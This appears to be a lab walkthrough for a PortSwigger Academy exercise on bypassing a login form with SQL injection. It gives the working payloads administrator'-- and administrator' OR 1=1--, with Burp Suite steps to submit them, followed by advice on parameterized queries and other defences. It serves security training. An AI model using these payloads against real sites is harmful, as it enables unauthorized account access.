# 🔐 SQL Injection Lab Walkthrough: Subverting Application Logic 🛠️  
## 🧪 PortSwigger Academy Lab — Bypassing Login with SQLi

> **Lab Difficulty:** Apprentice  
> **Objective:** Log in as the `administrator` user using SQL injection.  
> **Target Vulnerability:** SQL Injection (Login Bypass)  
> **Attack Type:** Subverting application logic via SQL comment injection  


## 🎯 Overview

In this lab, we exploit a **SQL injection vulnerability** in a login form to bypass authentication and log in as the `administrator` without knowing the password 💀.

This is a classic example of how unsanitized input can be used to **subvert application logic**, allowing attackers unauthorized access.



## 🧠 Understanding the Vulnerability

The backend uses a query like this to verify login credentials:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns a row → ✅ Login successful  
If not → ❌ Login failed

But what if we could manipulate the query so it always returns a result?

### 🔥 Attack Strategy:
Use an SQL comment (`--`) to **cut off** the rest of the query, skipping the password check.

Try submitting this as the username:
```text
administrator'--
```

And leave the password field blank.

The resulting query becomes:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

Everything after `--` is treated as a comment ➡️ The password condition is ignored!

So the query effectively becomes:
```sql
SELECT * FROM users WHERE username = 'administrator'
```

✅ If a user named `administrator` exists → Logged in!



## 🧪 Step-by-Step Exploitation Guide

### 🔹 Option 1: Using Burp Suite (Community Solution)

1. **Enable Burp Proxy** in your browser.
2. Submit any login attempt (e.g., `wiener` / `password`).
3. Intercept the request in **Burp Suite Repeater**.
4. Modify the `username` parameter to:
   ```
   administrator'--
   ```
5. Leave the `password` field blank or set it to anything.
6. Send the modified request.
7. 🎉 You should now be logged in as the `administrator`.



### 🔹 Option 2: Manual Approach (My Approach)

You tried:
```text
administrator' OR 1=1--
```

This also works because:
```sql
SELECT * FROM users WHERE username = 'administrator' OR 1=1-- AND password = ''
```

Since `1=1` is always true, it tricks the query into returning all rows where either the username is `administrator` **or** something always true happens → which means it may still return a valid user depending on the DB structure.

🧠 However, the cleaner and more reliable payload is:
```
administrator'--
```

It directly removes the password condition without relying on logic that might vary between databases.



## 🧼 Prevention: How to Fix This Vulnerability

Never trust user input! Here's how to prevent such attacks:

### ✅ Use Parameterized Queries / Prepared Statements
Always separate SQL logic from data.

#### Example (Python):
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

### ✅ Input Validation
Sanitize and validate all inputs. Reject malformed or suspicious strings like `'--`, `' OR 1=1`, etc.

### ✅ Use ORM Frameworks
Tools like SQLAlchemy, Django ORM, or Hibernate automatically handle SQL injection risks.

### ✅ Least Privilege Principle
Ensure the database user has minimal permissions — no need for admin rights in a login flow.

### ✅ Web Application Firewall (WAF)
Set up protections using tools like Cloudflare, AWS WAF, or ModSecurity to detect common SQLi patterns.



## 📚 Bonus: Try It Yourself

🔗 [PortSwigger Lab Link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

🎯 Goal: Log in as the `administrator` user.  
💡 Tip: Try both payloads and see which one works best in different environments.



## 🧩 Interactive Challenge 🧠

Let’s test what you’ve learned!

### ❓ Question:
What does the `--` do in SQL injection?

<details>
  <summary>Click to reveal answer</summary>

  The `--` is an SQL **comment operator**. Anything after it is ignored by the database engine. In this case, it skips the password comparison entirely.
</details>


## 🏁 Conclusion

This lab demonstrates how easily **unsanitized input** can lead to **critical security flaws** like **login bypass**.

🔒 Always treat user input as untrusted.  
🛠 Always use secure coding practices.  
🕵️ Always test for SQL injection vulnerabilities.
 labs!